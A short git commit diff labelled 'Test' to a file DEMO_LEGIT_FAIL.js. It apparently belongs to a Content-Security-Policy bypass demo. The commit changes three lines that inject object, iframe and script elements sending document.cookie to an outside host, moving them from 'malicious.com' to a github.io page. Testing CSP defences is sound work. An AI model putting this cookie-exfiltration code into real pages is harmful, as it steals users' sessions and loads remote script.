1f038af4dc34f462e24432af4d5bed132495b480
ibraheemmoosa <ibraheemmoosa1347@gmail.com>
2020-10-16 15:21:09 +0600

    Test

--- DEMO_LEGIT_FAIL.js
+++ DEMO_LEGIT_FAIL.js
@@ -1,15 +1,15 @@
 (function(){
 
 		var o = document.createElement("object");
-		o.data = `http://malicious.com/bypass-object-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
+		o.data = `https://ibraheemmoosa137.github.io/bypass-object-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
 		document.body.appendChild(o);
 
 		var i = document.createElement("iframe");
-		i.src = `http://malicious.com/bypass-child-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
+		i.src = `https://ibraheemmoosa137.github.io/bypass-child-src.html?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
 		document.body.appendChild(i);
 
 		var s = document.createElement("script");
-		s.src = `http://malicious.com/bypass-script-src.js?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
+		s.src = `https://ibraheemmoosa137.github.io/bypass-script-src.js?id=FAIL&cookie=${document.cookie}&rand=${performance.now()}`;
 		document.body.appendChild(s);
 
 }())
